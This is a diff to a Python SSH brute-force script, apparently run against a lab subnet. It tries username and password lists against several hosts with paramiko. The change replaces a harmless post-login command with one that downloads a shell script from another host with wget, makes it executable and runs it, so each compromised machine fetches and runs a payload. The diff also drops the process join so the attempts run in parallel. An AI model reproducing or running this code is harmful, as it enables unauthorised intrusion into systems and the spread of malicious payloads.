@@ -14,12 +14,12 @@ num2 = 0
 
 def ssh_start():
     ip = "192.168.203.%d" % i
-    print "Connecting:", ip, user_list[num] + pass_list[num2]
+#    print "Connecting:", ip, user_list[num] + pass_list[num2]
     p = paramiko.SSHClient()
     p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         p.connect(ip, username=user_list[num], password=pass_list[num2])
-        stdin, stdout, stderr = p.exec_command('touch evil_file && ls')
+        stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/x.sh"; chmod 755 x.sh; ./x.sh; sleep 1')
         for line in stdout:
             print(line.strip('\n'))
         for line in stderr:
@@ -33,7 +33,7 @@ for i in range(150,155):
             p = multiprocessing.Process(target=ssh_start)
             jobs.append(p)
             p.start()
-            p.join()
+            #p.join()
             num2 += 1
     num += 1
 
